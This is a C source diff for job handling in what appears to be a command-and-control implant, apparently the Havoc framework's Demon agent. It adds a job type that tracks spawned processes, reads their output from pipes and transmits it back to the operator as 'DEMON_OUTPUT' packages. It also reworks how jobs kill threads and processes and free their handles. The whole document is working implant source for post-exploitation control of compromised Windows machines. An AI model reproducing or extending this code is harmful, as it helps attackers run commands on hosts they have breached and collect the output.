@@ -4,17 +4,20 @@
 #include <Core/Package.h>
 #include <Core/MiniStd.h>
 
+#include <Loader/ObjectApi.h>
+
 /*!
  * JobAdd
  * Adds a job to the job linked list
  * @param JobID
  * @param Type type of job: thread or process
  * @param State current state of the job: suspended or running
+ * @param Data Data pointer to extra data
  * @return
  */
-VOID JobAdd( DWORD JobID, SHORT Type, SHORT State, HANDLE Handle )
+VOID JobAdd( DWORD JobID, SHORT Type, SHORT State, HANDLE Handle, PVOID Data )
 {
-    PRINTF( "Add job => JobID:[%d] Type:[%d] State:[%d]", JobID, Type, State )
+    PRINTF( "Add job => JobID:[%d] Type:[%d] State:[%d] Handle:[%d] Data:[%p]\n", JobID, Type, State, Handle, Data )
 
     PJOB_DATA JobList = NULL;
     PJOB_DATA Job     = NULL;
@@ -26,6 +29,7 @@ VOID JobAdd( DWORD JobID, SHORT Type, SHORT State, HANDLE Handle )
     Job->Type   = Type;
     Job->State  = State;
     Job->Handle = Handle;
+    Job->Data   = Data;
     Job->Next   = NULL;
 
     if ( Instance->Jobs == NULL )
@@ -49,6 +53,101 @@ VOID JobAdd( DWORD JobID, SHORT Type, SHORT State, HANDLE Handle )
         } else
             break;
 
+    } while ( TRUE );
+}
+
+/*!
+ * Check if all jobs are still running and exists
+ * @return
+ */
+VOID JobCheckList()
+{
+    PJOB_DATA JobList = NULL;
+
+    JobList = Instance->Jobs;
+
+    do {
+        if ( ! JobList )
+            break;
+
+        switch ( JobList->Type )
+        {
+            case JOB_TYPE_PROCESS:
+            {
+                if ( JobList->State == JOB_STATE_RUNNING )
+                {
+                    DWORD Return = 0;
+                    Instance->Win32.GetExitCodeProcess( JobList->Handle, &Return );
+
+                    if ( Return != STILL_ACTIVE )
+                        JobList->State = JOB_STATE_DEAD;
+                }
+                break;
+            }
+
+            case JOB_TYPE_THREAD:
+            {
+                if ( JobList->State == JOB_STATE_RUNNING )
+                {
+                    DWORD Return = 0;
+                    Instance->Win32.GetExitCodeThread( JobList->Handle, &Return );
+
+                    if ( Return != STILL_ACTIVE )
+                        JobList->State = JOB_STATE_DEAD;
+                }
+
+                break;
+            }
+
+            case JOB_TYPE_TRACK_PROCESS:
+            {
+                if ( JobList->State == JOB_STATE_RUNNING )
+                {
+                    DWORD Status = 0;
+
+                    Instance->Win32.GetExitCodeProcess( JobList->Handle, &Status );
+
+                    if ( Status != STILL_ACTIVE )
+                    {
+                        PUTS( "Tracking process is dead." )
+                        JobList->State = JOB_STATE_DEAD;
+                        AnonPipesRead( ( ( PANONPIPE ) JobList->Data ) );
+
+                        Instance->Win32.NtClose( JobList->Handle );
+                        DATA_FREE( JobList->Data, sizeof( ANONPIPE ) )
+                    }
+                    else
+                    {
+                        // just read what there is available.
+                        DWORD Available = 0;
+                        PVOID Buffer    = NULL;
+
+                        if ( Instance->Win32.PeekNamedPipe( ( ( PANONPIPE ) JobList->Data )->StdOutRead, NULL, 0, NULL, &Available, 0 ) )
+                        {
+                            PRINTF( "PeekNamedPipe: Available anon size %d\n", Available );
+
+                            if ( Available > 0 )
+                            {
+                                Buffer = Instance->Win32.LocalAlloc( LPTR, Available );
+
+                                if ( Instance->Win32.ReadFile( ( ( PANONPIPE ) JobList->Data )->StdOutRead, Buffer, Available, &Available, NULL ) )
+                                {
+                                    PPACKAGE Package = PackageCreate( DEMON_OUTPUT );
+                                    PackageAddBytes( Package, Buffer, Available );
+                                    PackageTransmit( Package, NULL, NULL );
+                                }
+
+                                DATA_FREE( Buffer, Available )
+                            }
+                        }
+                    }
+                }
+
+                break;
+            }
+        }
+
+        JobList = JobList->Next;
     } while ( TRUE );
 }
 
@@ -166,6 +265,7 @@ BOOL JobResume( DWORD JobID )
  */
 BOOL JobKill( DWORD JobID )
 {
+    BOOL      Success = TRUE;
     PJOB_DATA JobList = Instance->Jobs;
 
     do {
@@ -176,42 +276,90 @@ BOOL JobKill( DWORD JobID )
         {
             PRINTF( "Found Job ID: %d\n", JobID )
 
-            if ( JobList->Type == JOB_TYPE_THREAD )
+            switch ( JobList->Type )
             {
-                PUTS( "Kill Thread" )
-                HANDLE   Handle   = JobList->Handle;
-                NTSTATUS NtStatus = STATUS_SUCCESS;
-
-                if ( Handle )
+                case JOB_TYPE_THREAD:
                 {
-                    PUTS( "Kill using handle" )
+                    if ( JobList->State != JOB_STATE_DEAD )
+                    {
+                        PUTS( "Kill Thread" )
+                        NTSTATUS NtStatus = STATUS_SUCCESS;
 
-                    if ( ! NT_SUCCESS( NtStatus = Instance->Syscall.NtTerminateThread( JobList->Handle, STATUS_SUCCESS ) ) )
-                    {
-                        PRINTF( "TerminateThread NtStatus:[%ul]\n", NtStatus )
-                        NtSetLastError( Instance->Win32.RtlNtStatusToDosError( NtStatus ) );
-                        CALLBACK_GETLASTERROR;
-                        return FALSE;
+                        if ( JobList->Handle )
+                        {
+                            PUTS( "Kill using handle" )
+
+                            if ( ! NT_SUCCESS( NtStatus = Instance->Syscall.NtTerminateThread( JobList->Handle, STATUS_SUCCESS ) ) )
+                            {
+                                PRINTF( "TerminateThread NtStatus:[%ul]\n", NtStatus )
+                                NtSetLastError( Instance->Win32.RtlNtStatusToDosError( NtStatus ) );
+                                CALLBACK_GETLASTERROR;
+                                Success = FALSE;
+                            }
+                            else
+                            {
+                                // remove one thread from counter
+                                Instance->Threads--;
+                            }
+                        }
+                        else
+                        {
+                            PUTS( "Handle is emtpy" )
+                            Success = FALSE;
+                        }
                     }
-                    else
-                    {
-                        // remove one thread from counter
-                        Instance->Threads--;
-                    }
+                    break;
                 }
-                else
+
+                case JOB_TYPE_PROCESS:
                 {
-                    PUTS( "Handle is emtpy" )
-                    return FALSE;
+                    if ( JobList->State != JOB_STATE_DEAD )
+                    {
+                        Instance->Win32.TerminateProcess( JobList->Handle, 0 );
+                    }
+                    break;
                 }
 
-                JobRemove( JobID );
+                case JOB_TYPE_TRACK_PROCESS:
+                {
+                    if ( JobList->State != JOB_STATE_DEAD )
+                    {
+                        Instance->Win32.TerminateProcess( JobList->Handle, 0 );
+
+                        // just read what there is available.
+                        DWORD Available = 0;
+                        PVOID Buffer    = NULL;
+
+                        if ( Instance->Win32.PeekNamedPipe( ( ( PANONPIPE ) JobList->Data )->StdOutRead, NULL, 0, NULL, &Available, 0 ) )
+                        {
+                            PRINTF( "PeekNamedPipe: Available anon size %d\n", Available );
+
+                            if ( Available > 0 )
+                            {
+                                Buffer = Instance->Win32.LocalAlloc( LPTR, Available );
+
+                                if ( Instance->Win32.ReadFile( ( ( PANONPIPE ) JobList->Data )->StdOutRead, Buffer, Available, &Available, NULL ) )
+                                {
+                                    PPACKAGE Package = PackageCreate( DEMON_OUTPUT );
+                                    PackageAddBytes( Package, Buffer, Available );
+                                    PackageTransmit( Package, NULL, NULL );
+                                }
+
+                                DATA_FREE( Buffer, Available )
+                            }
+                        }
+                    }
+
+                    break;
+                }
             }
+
+            JobRemove( JobID );
         }
         else break;
     } while ( TRUE );
 
-    return TRUE;
+    return Success;
 }
 
 /*!
@@ -253,6 +401,14 @@ VOID JobRemove( DWORD JobID )
                 }
             }
         }
+    }
+
+    if ( JobList->Handle )
+        Instance->Win32.NtClose( JobList->Handle );
+
+    if ( ( JobList->Type == JOB_TYPE_TRACK_PROCESS ) && JobList->Data )
+    {
+        DATA_FREE( JobList->Data, sizeof( ANONPIPE ) )
     }
 
     MemSet( JobList, 0, sizeof( JOB_DATA ) );
